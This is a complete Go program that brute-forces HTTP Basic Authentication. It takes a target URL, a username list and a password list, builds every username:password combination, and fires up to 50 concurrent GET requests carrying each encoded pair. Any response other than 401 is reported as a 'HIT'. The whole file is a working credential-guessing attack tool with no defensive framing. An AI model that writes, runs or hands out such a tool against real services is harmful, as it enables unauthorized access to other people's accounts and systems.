package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
)

func create_auth_list(uFile, pFile string) []string {
	readLines := func(path string) []string {
		f, err := os.Open(path)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to open file %s: %v\n", path, err)
			os.Exit(1)
		}
		defer f.Close()

		var out []string
		s := bufio.NewScanner(f)
		for s.Scan() {
			line := strings.TrimSpace(s.Text())
			if line != "" {
				out = append(out, line)
			}
		}
		if err := s.Err(); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Error reading file %s: %v\n", path, err)
			os.Exit(1)
		}
		return out
	}

	users := readLines(uFile)
	passes := readLines(pFile)

	var basic_auth []string
	for _, u := range users {
		for _, p := range passes {
			basic_auth = append(basic_auth,
				base64.StdEncoding.EncodeToString([]byte(u+":"+p)))
		}
	}
	return basic_auth
}

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintf(os.Stderr, "Usage: %s URL USERNAME_LIST PASSWORD_LIST MAX_REQUESTS\n", os.Args[0])
		os.Exit(1)
	}

	domain_path := os.Args[1]
	userFile := os.Args[2]
	passFile := os.Args[3]

	maxRequests, err := strconv.Atoi(os.Args[4])
	if err != nil || maxRequests <= 0 {
		fmt.Fprintf(os.Stderr, "[-] Invalid MAX_REQUESTS: %s\n", os.Args[4])
		os.Exit(1)
	}

	auth_list := create_auth_list(userFile, passFile)

	client := &http.Client{}

	maxConcurrency := 50
	limiter := make(chan struct{}, maxConcurrency)
	sent := 0

	progressInterval := 5000 // prints once per 5k requests

	for _, auth := range auth_list {
		if sent >= maxRequests {
			break
		}

		limiter <- struct{}{}
		go func(a string) {
			defer func() { <-limiter }()

			req, err := http.NewRequest("GET", domain_path, nil)
			if err != nil {
				return
			}

			req.Header.Set("Authorization", "Basic "+a)
			req.Header.Set("User-Agent", "MyGoRequester/1.0")

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			// Print only if potentially correct
			if resp.StatusCode != http.StatusUnauthorized {
				fmt.Printf("[HIT] %s (status %d)\n", a, resp.StatusCode)
			}
		}(auth)

		sent++

		// Light, non-noisy progress
		if sent%progressInterval == 0 {
			fmt.Printf("... %d requests sent\n", sent)
		}
	}

	// Wait for all goroutines
	for i := 0; i < cap(limiter); i++ {
		limiter <- struct{}{}
	}
}
